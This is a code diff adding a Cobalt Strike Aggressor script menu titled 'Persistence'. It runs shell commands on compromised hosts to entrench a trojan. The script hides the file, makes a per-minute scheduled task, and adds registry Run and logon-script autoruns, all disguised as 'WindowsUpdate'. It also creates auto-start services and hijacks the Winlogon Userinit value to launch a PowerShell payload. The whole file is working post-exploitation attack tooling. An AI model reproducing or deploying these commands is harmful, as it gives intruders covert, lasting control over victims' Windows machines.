@@ -1,0 +1,93 @@
+ popup beacon_bottom {
+     menu "Persistence" {
+     item "Set Trojan_Add" {
+        local('$bid');
+        foreach $bid ($1){
+            prompt_text("filePath", $filePath, {
+                $filePath = $1;
+                return $filePath;
+            });
+        }
+    }
+	item "Set Web_Deli" {
+	local('$bid');
+	foreach $bid ($1){
+            prompt_text("filePath2", $filePath2, {
+                $filePath2 = $1;
+                return $filePath2;
+            });
+        }
+    }
+    item "Trojan_Hidden" {
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "attrib \"$filePath\" +s +h");
+        }
+	}
+    item "Schedule_Task" {
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "schtasks /create /tn WindowsUpdate /tr \"$filePath\" /sc minute /mo 1");
+        }
+	}
+    item "Reg_Autorun"{
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d \"$filePath\" /f");
+	    bshell($1, "reg add HKEY_CURRENT_USER\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"$filePath\" /f");
+        }
+	}
+    item "SC_Autorun"{
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "sc create \"WindowsUpdate\" binpath= \"cmd /c start \"$filePath\"\"&&sc config \"WindowsUpdate\" start= auto&&net start WindowsUpdate");
+
+        }
+        }
+    item "Reg_Autorun By PS"{
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\$filePath2\" /f");
+        }
+	}
+
+    item "SC_Autorun By PS"{
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "sc create \"WindowsSetup\" binpath= \"cmd /c $filePath2\"&&sc config \"WindowsSetup\" start= auto&&net start WindowsSetup");
+
+        }
+        }
+       item "Lazy_Man" {
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "attrib \"$filePath\" +s +h");
+            bshell($1, "schtasks /create /tn WindowsUpdate /tr \"$filePath\" /sc minute /mo 1");
+            bshell($1, "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d \"$filePath\" /f");
+	    bshell($1, "reg add HKEY_CURRENT_USER\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"$filePath\" /f");
+            bshell($1, "sc create \"WindowsUpdate\" binpath= \"cmd /c start \"$filePath\"\"&&sc config \"WindowsUpdate\" start= auto&&net start WindowsUpdate");
+	    bshell($1, "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\$filePath2,$filePath\" /f");
+	    bshell($1, "sc create \"WindowsSetup\" binpath= \"cmd /c $filePath2\"&&sc config \"WindowsSetup\" start= auto&&net start WindowsSetup");
+        }
+        }
+       item "Lazy_Powershell" {
+        local('$bid');
+        foreach $bid ($1){
+	    bshell($1, "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\$filePath2\" /f");
+	    bshell($1, "sc create \"WindowsSetup\" binpath= \"cmd /c $filePath2\"&&sc config \"WindowsSetup\" start= auto&&net start WindowsSetup");
+        }
+        }
+	item "Fuck_Lazy" {
+        local('$bid');
+        foreach $bid ($1){
+            bshell($1, "attrib \"$filePath\" -s -h");
+            bshell($1, "schtasks /delete /tn WindowsUpdate /f");
+            bshell($1, "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /f");
+	    bshell($1, "reg delete HKEY_CURRENT_USER\\Environment /v UserInitMprLogonScript /f");
+            bshell($1, "sc delete \"windowsupdate\"");
+	    bshell($1, "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\Windows\\system32\\userinit.exe,\" /f");
+	    bshell($1, "sc delete \"windowsSetup\"");
+        }
+        }
+        }
+        }
